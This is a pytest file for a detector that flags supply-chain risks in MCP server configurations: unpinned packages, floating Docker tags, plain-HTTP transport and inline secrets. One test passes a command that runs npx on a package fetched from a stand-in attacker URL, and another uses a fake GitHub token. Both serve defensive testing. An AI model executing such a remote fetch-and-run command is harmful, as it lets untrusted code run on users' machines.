"""Supply-chain detection: pinning, floating tags, transport, config hygiene."""

from __future__ import annotations

from pathlib import Path

import pytest

from mcp_scrutiny.collectors.config import load_config
from mcp_scrutiny.detectors import ScanContext
from mcp_scrutiny.detectors.pinning import PinningDetector
from mcp_scrutiny.models import ScanResult, ServerSpec, Severity
from tests.conftest import make_server


def run(servers: list[ServerSpec]):
    result = ScanResult(servers=servers)
    findings = PinningDetector().run(result, ScanContext())
    return result, findings


@pytest.mark.parametrize(
    "args",
    [
        ["-y", "postmark-mcp"],
        ["-y", "@modelcontextprotocol/server-filesystem"],
        ["-y", "pkg@latest"],
        ["-y", "pkg@next"],
        ["uvx", "pkg"],
    ],
)
def test_floating_packages_are_flagged(args: list[str]) -> None:
    command = "uvx" if args[0] == "uvx" else "npx"
    rest = args[1:] if args[0] == "uvx" else args
    _, findings = run([make_server("s", [], command=command, args=rest)])
    assert any("Unpinned package" in f.title for f in findings)


@pytest.mark.parametrize(
    "args",
    [
        ["-y", "pkg@1.2.3"],
        ["-y", "@scope/pkg@2025.8.21"],
        ["-y", "pkg@0.0.1-beta.2"],
    ],
)
def test_npm_pinned_versions_are_not_flagged(args: list[str]) -> None:
    _, findings = run([make_server("s", [], command="npx", args=args)])
    assert not any("Unpinned package" in f.title for f in findings)


@pytest.mark.parametrize("args", [["pkg==1.2.0"], ["pkg~=1.2"], ["pkg>=2.0,<3.0"]])
def test_uv_pinned_versions_are_not_flagged(args: list[str]) -> None:
    """Regression: '==' was read as 'no version' and every uv pin was flagged."""
    _, findings = run([make_server("s", [], command="uvx", args=args)])
    assert not any("Unpinned package" in f.title for f in findings)


def test_npx_from_a_url_is_critical() -> None:
    _, findings = run(
        [make_server("s", [], command="npx", args=["-y", "https://evil.example/payload.tgz"])]
    )
    assert any(f.severity is Severity.CRITICAL for f in findings)


def test_auto_confirm_flag_is_reported_in_the_evidence() -> None:
    _, findings = run([make_server("s", [], command="npx", args=["-y", "pkg"])])
    finding = next(f for f in findings if "Unpinned package" in f.title)
    assert finding.evidence["auto_confirm"] is True


def test_docker_latest_is_flagged() -> None:
    _, findings = run([make_server("s", [], command="docker", args=["run", "-i", "mcp/tools:latest"])])
    assert any("not pinned by digest" in f.title for f in findings)


def test_docker_untagged_is_flagged() -> None:
    _, findings = run([make_server("s", [], command="docker", args=["run", "-i", "mcp/tools"])])
    assert any("not pinned by digest" in f.title for f in findings)


def test_plain_http_remote_is_flagged() -> None:
    _, findings = run([make_server("s", [], url="http://mcp.example.com/sse", env={"TOKEN": "x"})])
    assert any(f.severity is Severity.HIGH and "plain HTTP" in f.title for f in findings)


def test_https_remote_is_accepted() -> None:
    _, findings = run(
        [make_server("s", [], url="https://mcp.example.com/mcp", env={"API_TOKEN": "x"})]
    )
    assert not any("plain HTTP" in f.title for f in findings)
    assert not any("no credential" in f.title for f in findings)


def test_inline_secret_is_flagged_but_a_placeholder_is_not() -> None:
    _, real = run([make_server("s", [], command="python", env={"GITHUB_TOKEN": "ghp_9f2Kd8sLmQ4vXzR7"})])
    assert any("Long-lived credential" in f.title for f in real)

    _, placeholder = run([make_server("s", [], command="python", env={"VAULT_TOKEN": "${VAULT_TOKEN}"})])
    assert not any("Long-lived credential" in f.title for f in placeholder)


def test_secret_in_argv_is_flagged() -> None:
    _, findings = run([make_server("s", [], command="python", args=["--api-key=abc123"])])
    assert any("command line" in f.title for f in findings)


def test_vulnerable_fixture_yields_the_expected_classes(vulnerable_config: Path) -> None:
    servers = load_config(vulnerable_config)
    _, findings = run(servers)
    titles = " | ".join(f.title for f in findings)
    assert "Unpinned package executed on every start: postmark-mcp" in titles
    assert "plain HTTP" in titles
    assert "not pinned by digest" in titles
    assert "GITHUB_TOKEN" in titles
    # The uv-pinned git server must not be reported.
    assert "mcp-server-git" not in titles


def test_clean_fixture_is_quiet(clean_config: Path) -> None:
    servers = load_config(clean_config)
    _, findings = run(servers)
    assert [f.title for f in findings] == []
